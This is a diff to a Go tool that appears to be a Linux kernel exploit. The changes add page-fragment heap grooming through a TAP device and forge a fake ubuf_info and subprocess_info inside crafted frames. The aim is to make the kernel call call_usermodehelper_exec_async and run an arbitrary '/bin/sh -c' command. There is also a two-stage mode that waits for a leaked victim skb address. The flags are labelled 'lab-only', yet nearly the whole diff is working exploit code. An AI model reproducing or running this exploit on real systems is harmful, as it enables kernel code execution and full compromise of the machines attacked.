@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/binary"
 	"encoding/hex"
 	"errors"
@@ -10,6 +11,8 @@ import (
 	"os"
 	"runtime"
 	"sort"
+	"strconv"
+	"strings"
 	"syscall"
 	"time"
 	"unsafe"
@@ -50,39 +53,50 @@ func main() {
 }
 
 type cfg struct {
-	head         int
-	rest         int
-	tebar        int
-	tebarFill    byte
-	capture      time.Duration
-	count        int
-	page         bool
-	skipVerify   bool
-	egress       bool
-	egressRest   int
-	iface        string
-	dst          string
-	src          string
-	gateway      string
-	dstMAC       string
-	egressWait   time.Duration
-	egressSpray  int
-	egressFill   byte
-	sprayDelay   time.Duration
-	vlanTags     int
-	answerDstARP bool
-	transport    string
-	udpSrcPort   int
-	udpPort      int
-	tcpSrcPort   int
-	tcpPort      int
-	tcpValid     bool
-	staleOptions bool
-	staleOptSkip int
-	staleOptLen  int
-	staleGroom   bool
-	csumOffset   int
-	csumWord     uint
+	head          int
+	rest          int
+	tebar         int
+	tebarFill     byte
+	capture       time.Duration
+	count         int
+	page          bool
+	skipVerify    bool
+	egress        bool
+	egressRest    int
+	iface         string
+	dst           string
+	src           string
+	gateway       string
+	dstMAC        string
+	egressWait    time.Duration
+	egressSpray   int
+	egressFill    byte
+	sprayDelay    time.Duration
+	vlanTags      int
+	answerDstARP  bool
+	transport     string
+	udpSrcPort    int
+	udpPort       int
+	tcpSrcPort    int
+	tcpPort       int
+	tcpValid      bool
+	staleOptions  bool
+	staleOptSkip  int
+	staleOptLen   int
+	staleGroom    bool
+	staleGrooms   int
+	staleDelay    time.Duration
+	staleEach     time.Duration
+	staleHold     bool
+	staleHead     uint64
+	staleHeadFile string
+	staleCallback uint64
+	staleCopyLen  int
+	staleExec     uint64
+	staleNoop     uint64
+	staleCommand  string
+	csumOffset    int
+	csumWord      uint
 }
 
 func parseCfg() cfg {
@@ -117,6 +131,17 @@ func parseCfg() cfg {
 	flag.IntVar(&c.staleOptSkip, "stale-option-skip", 0, "lab-only: copied option bytes before the stale non-copied option (0 or 2..6)")
 	flag.IntVar(&c.staleOptLen, "stale-option-len", 40, "lab-only: bytes changed to IPOPT_NOOP by the stale option")
 	flag.BoolVar(&c.staleGroom, "stale-page-groom", false, "lab-only: seed one page-frag chunk with a 0x6b marker before the short child (exploratory)")
+	flag.IntVar(&c.staleGrooms, "stale-groom-count", 1, "lab-only: number of 3840-byte marker allocations before the short child")
+	staleDelayMs := flag.Int("stale-groom-delay-ms", 50, "lab-only: delay after marker allocations")
+	staleEachUS := flag.Int("stale-groom-each-delay-us", 0, "lab-only: delay after each marker allocation")
+	flag.BoolVar(&c.staleHold, "stale-groom-hold", true, "lab-only: hold marker SKBs in a TAP packet-socket queue until all chunks are allocated")
+	flag.Uint64Var(&c.staleHead, "stale-groom-head", 0, "lab-only: predicted victim skb head address for fake ubuf_info")
+	flag.StringVar(&c.staleHeadFile, "stale-groom-head-file", "", "lab-only: two-stage mode; wait for a file containing the probed victim head address")
+	flag.Uint64Var(&c.staleCallback, "stale-groom-callback", 0, "lab-only: fake ubuf_info completion callback address")
+	flag.IntVar(&c.staleCopyLen, "stale-copy-len", 0, "lab-only: terminate fake ubuf_info after this many non-NUL bytes for a strcpy callback")
+	flag.Uint64Var(&c.staleExec, "stale-groom-umh-async", 0, "lab-only: call_usermodehelper_exec_async address used after a strcpy callback")
+	flag.Uint64Var(&c.staleNoop, "stale-groom-noop-ret", 0, "lab-only: zero-returning callback used by the fake subprocess_info")
+	flag.StringVar(&c.staleCommand, "stale-groom-command", "echo BENGSKY_RCE_OK >/tmp/bengsky-rce", "lab-only: /bin/sh -c command for the fake subprocess_info")
 	flag.IntVar(&c.csumOffset, "csum-offset", 0, "deferred checksum write offset from the IPv4 header start")
 	flag.UintVar(&c.csumWord, "csum-word", 0x004f, "desired host-endian 16-bit deferred checksum value")
 	egressWaitMs := flag.Int("egress-wait-ms", 5000, "time to collect ICMP quotations in egress mode")
@@ -125,6 +150,8 @@ func parseCfg() cfg {
 	c.egressFill = byte(*egressFill)
 	c.sprayDelay = time.Duration(*sprayDelayUS) * time.Microsecond
 	c.capture = time.Duration(*captureMs) * time.Millisecond
+	c.staleDelay = time.Duration(*staleDelayMs) * time.Millisecond
+	c.staleEach = time.Duration(*staleEachUS) * time.Microsecond
 	c.egressWait = time.Duration(*egressWaitMs) * time.Millisecond
 	if c.head < 8 || c.head%8 != 0 || c.head > 40 {
 		fmt.Fprintln(os.Stderr, "-head must be a multiple of 8 in 8..40")
@@ -200,6 +227,26 @@ func parseCfg() cfg {
 	}
 	if c.staleGroom && (!c.staleOptions || !c.page) {
 		fmt.Fprintln(os.Stderr, "-stale-page-groom requires -stale-options-write -page")
+		os.Exit(1)
+	}
+	if c.staleGrooms < 1 || c.staleGrooms > 256 || c.staleDelay < 0 || c.staleDelay > 10*time.Second || c.staleEach < 0 || c.staleEach > time.Second {
+		fmt.Fprintln(os.Stderr, "stale groom count must be 1..256, final delay 0..10000 ms, and per-groom delay 0..1000000 us")
+		os.Exit(1)
+	}
+	if c.staleHeadFile != "" && c.staleHead != 0 {
+		fmt.Fprintln(os.Stderr, "use either -stale-groom-head or -stale-groom-head-file")
+		os.Exit(1)
+	}
+	if (c.staleHead != 0 || c.staleHeadFile != "") != (c.staleCallback != 0) || ((c.staleHead != 0 || c.staleHeadFile != "") && !c.staleGroom) {
+		fmt.Fprintln(os.Stderr, "stale groom head/head-file and callback must be supplied together and require -stale-page-groom")
+		os.Exit(1)
+	}
+	if c.staleCopyLen < 0 || c.staleCopyLen > 80 || (c.staleCopyLen != 0 && c.staleCallback == 0) {
+		fmt.Fprintln(os.Stderr, "-stale-copy-len must be in 0..80 and requires stale groom head/head-file plus callback")
+		os.Exit(1)
+	}
+	if c.staleExec != 0 && ((c.staleHead == 0 && c.staleHeadFile == "") || c.staleCallback == 0 || c.staleNoop == 0) {
+		fmt.Fprintln(os.Stderr, "-stale-groom-umh-async requires stale groom head/head-file, callback, and noop-ret addresses")
 		os.Exit(1)
 	}
 	if c.transport == "tcp" && ((!c.egress && c.head+c.rest < 60) || (c.egress && c.head+c.egressRest < 60)) {
@@ -286,11 +333,95 @@ func run(c cfg) error {
 func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
-	if c.staleGroom {
-		if err := writeTap(tap, stalePageGroomFrame(0x6b), false, 0, 0); err != nil {
-			return fmt.Errorf("stale-options: page groom: %w", err)
+	if c.staleHeadFile == "" {
+		return runStaleOptionsAttempt(tap, cap, c)
+	}
+
+	probe := c
+	probe.staleOptLen = 14
+	probe.staleHead = 0
+	probe.staleCallback = 0
+	if err := runStaleOptionsAttempt(tap, cap, probe); err != nil {
+		return fmt.Errorf("stale-options probe stage: %w", err)
+	}
+	fmt.Printf("stale-options: probe ready; write the observed victim head to %s\n", c.staleHeadFile)
+	head, err := waitForKernelAddress(c.staleHeadFile, 30*time.Second)
+	if err != nil {
+		return err
+	}
+	attack := c
+	attack.staleHead = head
+	attack.staleHeadFile = ""
+	// The probe leaves its victim page cached in this task_frag. Eight
+	// 3840-byte held grooms seed that same page without advancing to another.
+	attack.staleGrooms = 8
+	fmt.Printf("stale-options: callback stage head=%#x callback=%#x groom_count=%d\n",
+		attack.staleHead, attack.staleCallback, attack.staleGrooms)
+	return runStaleOptionsAttempt(tap, cap, attack)
+}
+
+func waitForKernelAddress(path string, timeout time.Duration) (uint64, error) {
+	deadline := time.Now().Add(timeout)
+	for time.Now().Before(deadline) {
+		data, err := os.ReadFile(path)
+		if err == nil && strings.TrimSpace(string(data)) != "" {
+			value, parseErr := strconv.ParseUint(strings.TrimSpace(string(data)), 0, 64)
+			if parseErr != nil {
+				return 0, fmt.Errorf("parse victim head from %s: %w", path, parseErr)
+			}
+			return value, nil
 		}
-		time.Sleep(50 * time.Millisecond)
+		if err != nil && !errors.Is(err, os.ErrNotExist) {
+			return 0, fmt.Errorf("read victim head from %s: %w", path, err)
+		}
+		time.Sleep(20 * time.Millisecond)
+	}
+	return 0, fmt.Errorf("timed out waiting for victim head in %s", path)
+}
+
+func runStaleOptionsAttempt(tap *os.File, cap *capture, c cfg) error {
+	if c.staleGroom {
+		var hold *capture
+		if c.staleHold {
+			var err error
+			hold, err = listen(getenv("PWN_TAP", "bengskytap"))
+			if err != nil {
+				return fmt.Errorf("stale-options: open groom hold socket: %w", err)
+			}
+			if err := syscall.SetsockoptInt(hold.fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4<<20); err != nil {
+				hold.Close()
+				return fmt.Errorf("stale-options: grow groom hold queue: %w", err)
+			}
+		}
+		for i := 0; i < c.staleGrooms; i++ {
+			frame, err := stalePageGroomFrame(0x6b, c.staleHead, c.staleCallback, c.staleCopyLen, c.staleExec, c.staleNoop, c.staleCommand)
+			if err != nil {
+				if hold != nil {
+					hold.Close()
+				}
+				return fmt.Errorf("stale-options: build page groom %d/%d: %w", i+1, c.staleGrooms, err)
+			}
+			if err := writeTap(tap, frame, false, 0, 0); err != nil {
+				if hold != nil {
+					hold.Close()
+				}
+				return fmt.Errorf("stale-options: page groom %d/%d: %w", i+1, c.staleGrooms, err)
+			}
+			if c.staleEach > 0 {
+				time.Sleep(c.staleEach)
+			}
+		}
+		if hold != nil {
+			if err := hold.drainCount(c.staleGrooms, 2*time.Second); err != nil {
+				hold.Close()
+				return fmt.Errorf("stale-options: drain groom hold queue: %w", err)
+			}
+			hold.Close()
+		}
+		// The output capture socket also sees the marker frames. Drain it so
+		// those queued clones release their page references before the short
+		// fragment asks task_frag to recycle the just-seeded compound page.
+		cap.drain(c.staleDelay)
 	}
 	const desired = uint16(0x0045) // network bytes 45 00: shrink IHL 15 to IHL 5
 	id := uint16(ipID)
@@ -332,8 +463,8 @@ func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
 	}
 
 	pkts := cap.collect(c.capture, id)
-	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d\n",
-		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags)
+	fmt.Printf("stale-options: original_ihl=15 deferred_word=0x%04x option_skip=%d option_len=%d fragments=%d page=%t vlan_tags=%d groom=%t groom_count=%d groom_each=%s groom_delay=%s groom_hold=%t\n",
+		desired, c.staleOptSkip, c.staleOptLen, len(pkts), c.page, c.vlanTags, c.staleGroom, c.staleGrooms, c.staleEach, c.staleDelay, c.staleHold)
 	for i, ip := range pkts {
 		if len(ip) < ipLen {
 			continue
@@ -354,17 +485,96 @@ func runStaleOptionsWrite(tap *os.File, cap *capture, c cfg) error {
 	return nil
 }
 
-func stalePageGroomFrame(fill byte) []byte {
-	// With TUN_RX_PAD=64, a 3700-byte frame makes tun_build_skb request
-	// one 4096-byte chunk: ALIGN(3700+64, 64)+320. This seeds bytes that would
-	// overlap frags[0] if the short frame later reclaims the chunk at offset
-	// zero. It intentionally does not claim to exhaust task_frag: kernels using
-	// SKB_FRAG_PAGE_ORDER commonly cache a 32768-byte high-order page.
-	frame := bytesRepeat(3700, fill)
+func stalePageGroomFrame(fill byte, victimHead, callback uint64, copyLen int, execAsync, noopRet uint64, command string) ([]byte, error) {
+	// 3456 is the largest convenient frame that still passes tun_can_build_skb's
+	// PAGE_SIZE eligibility check, which includes TUN_RX_PAD, XDP headroom, and
+	// skb_shared_info. With no XDP program the actual task_frag chunk is 3840
+	// bytes, so eight chunks fit in a 32768-byte high-order page and the ninth
+	// starts at offset zero in a fresh page.
+	frame := bytesRepeat(3456, fill)
 	copy(frame[0:6], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x01})
 	copy(frame[6:12], []byte{0x02, 0x00, 0x00, 0x00, 0x00, 0x02})
 	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
-	return frame
+	if victimHead != 0 {
+		// The reclaimed short child has end=128. skb_shared_info starts
+		// there, destructor_arg is at +40, and frags[] starts at +48.
+		// Predecessor bytes start at head+64, so frame offsets 104, 120,
+		// and 144 seed destructor_arg, a fake ubuf_info, and fake ops.
+		const fakeUarg = 184
+		fakeOps := uint64(208)
+		if execAsync != 0 {
+			if callback == 0 || noopRet == 0 {
+				return nil, errors.New("fake subprocess_info requires callback and noop-ret addresses")
+			}
+			// fakeUarg is also the strcpy source. Put fake ops at source+80:
+			// this avoids NUL bytes in its page-relative address and makes the
+			// callback pointer overlap the unused cleanup field of the fake
+			// subprocess_info. The overwritten skb destructor at source+96
+			// invokes call_usermodehelper_exec_async(skb).
+			fakeOps = fakeUarg + 80
+			copyLen = 104
+		}
+		if copyLen != 0 && execAsync == 0 {
+			// Offset 0x111 avoids NUL bytes in the little-endian pointer
+			// when victimHead is page aligned. This lets strcpy copy a
+			// selected non-NUL span from fakeUarg.
+			fakeOps = 0x111
+		}
+		binary.LittleEndian.PutUint64(frame[104:112], victimHead+fakeUarg)
+		binary.LittleEndian.PutUint64(frame[120:128], victimHead+fakeOps)
+		if copyLen != 0 {
+			for i := 8; i < copyLen; i++ {
+				frame[120+i] = fill
+			}
+			frame[120+copyLen] = 0
+		} else {
+			binary.LittleEndian.PutUint32(frame[128:132], 1)
+			frame[132] = 0
+		}
+		opsAt := int(fakeOps) - 64
+		binary.LittleEndian.PutUint64(frame[opsAt:opsAt+8], callback)
+		binary.LittleEndian.PutUint64(frame[opsAt+8:opsAt+16], 0)
+		if execAsync != 0 {
+			const (
+				pathOff  = 0x511
+				dashCOff = 0x531
+				cmdOff   = 0x551
+				argvOff  = 0x711
+				envpOff  = 0x791
+			)
+			uargAt := fakeUarg - 64
+			put64 := func(sourceOff int, value uint64) {
+				binary.LittleEndian.PutUint64(frame[uargAt+sourceOff:uargAt+sourceOff+8], value)
+			}
+			putHead := func(headOff int, value []byte) {
+				copy(frame[headOff-64:], value)
+			}
+			put64(0, victimHead+fakeOps)
+			put64(40, victimHead+pathOff)
+			put64(48, victimHead+argvOff)
+			put64(56, victimHead+envpOff)
+			binary.LittleEndian.PutUint32(frame[uargAt+64:uargAt+68], 0x02020202)
+			put64(72, noopRet)
+			put64(80, callback)
+			put64(88, victimHead+cmdOff)
+			put64(96, execAsync)
+			frame[uargAt+copyLen] = 0
+			if bytes.IndexByte(frame[uargAt:uargAt+copyLen], 0) >= 0 {
+				return nil, fmt.Errorf("fake subprocess_info contains a NUL before byte %d for head %#x", copyLen, victimHead)
+			}
+
+			putHead(pathOff, append([]byte("/bin/sh"), 0))
+			putHead(dashCOff, []byte{'-', 'c', 0})
+			putHead(cmdOff, append([]byte(command), 0))
+			argvAt := argvOff - 64
+			binary.LittleEndian.PutUint64(frame[argvAt:argvAt+8], victimHead+pathOff)
+			binary.LittleEndian.PutUint64(frame[argvAt+8:argvAt+16], victimHead+dashCOff)
+			binary.LittleEndian.PutUint64(frame[argvAt+16:argvAt+24], victimHead+cmdOff)
+			binary.LittleEndian.PutUint64(frame[argvAt+24:argvAt+32], 0)
+			binary.LittleEndian.PutUint64(frame[envpOff-64:envpOff-56], 0)
+		}
+	}
+	return frame, nil
 }
 
 func solvePacketChecksumAt(pkt []byte, adjust int, desired uint16) bool {
@@ -675,6 +885,25 @@ func writeTap(tap *os.File, frame []byte, csum bool, start, offset uint16) error
 
 type capture struct{ fd int }
 
+func (c *capture) drainCount(count int, timeout time.Duration) error {
+	deadline := time.Now().Add(timeout)
+	buf := make([]byte, 65536)
+	for received := 0; received < count; {
+		if time.Now().After(deadline) {
+			return fmt.Errorf("received %d/%d frames before timeout", received, count)
+		}
+		_, _, err := syscall.Recvfrom(c.fd, buf, 0)
+		if err != nil {
+			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) || errors.Is(err, syscall.EINTR) {
+				continue
+			}
+			return err
+		}
+		received++
+	}
+	return nil
+}
+
 func listen(ifname string) (*capture, error) {
 	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(syscall.ETH_P_ALL)))
 	if err != nil {
@@ -694,6 +923,17 @@ func listen(ifname string) (*capture, error) {
 }
 
 func (c *capture) Close() { syscall.Close(c.fd) }
+
+func (c *capture) drain(d time.Duration) {
+	deadline := time.Now().Add(d)
+	buf := make([]byte, 65536)
+	for time.Now().Before(deadline) {
+		_, _, err := syscall.Recvfrom(c.fd, buf, 0)
+		if err != nil && !errors.Is(err, syscall.EAGAIN) && !errors.Is(err, syscall.EWOULDBLOCK) {
+			return
+		}
+	}
+}
 
 func (c *capture) collect(d time.Duration, id uint16) [][]byte {
 	deadline := time.Now().Add(d)
